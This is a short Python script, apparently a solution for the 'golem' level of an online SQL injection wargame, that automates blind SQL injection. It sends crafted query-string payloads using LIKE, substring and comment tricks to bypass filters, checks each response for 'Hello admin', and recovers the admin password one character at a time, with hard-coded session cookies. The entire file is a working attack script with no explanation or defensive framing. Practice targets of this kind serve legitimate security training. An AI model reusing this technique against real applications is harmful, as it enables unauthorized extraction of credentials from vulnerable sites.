#headers={'Host': 'los.eagle-jump.org', 'Cookie': 'PHPSESSID=vk15gvoskfe25pse40jh475fk6'}
import urllib
import urllib.request
length=8
pw=""
arr="1234567890qwertyuioplkjhgfdsazxcvbnmMNBVCXZASDFGHJKLPOIUYTREWQ"
MyHeader = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
'Accept-Encoding': 'none',
'Accept-Language': 'en-US,en;q=0.8',
'Connection': 'keep-alive'}
MyCookies = {'PHPSESSID': 'gou96ajoj5ojb4jo443qd9gqd6','_cfduid':'db874ed463a1dda475cbf0410b0e3f66c1494392708'}
for i in range(1,9):
	for j in range(0,62):
		url="http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw=' || id LIKE 'admin' %26%26 substring(pw,{0},1) LIKE '{ascii}' %23".format(i,ascii=arr[j])
		r = urllib.request.Request(url,headers=MyHeader)
		r.add_header("Cookie","PHPSESSID=ptu00rf0ggnk22t8t3gcdf9132")
		print(url)
		data = urllib.request.urlopen(r).read().decode("utf-8")
		if data.find('Hello admin') != -1 :
			pw = pw + arr[j]
			print(arr[j])
			break
print(pw)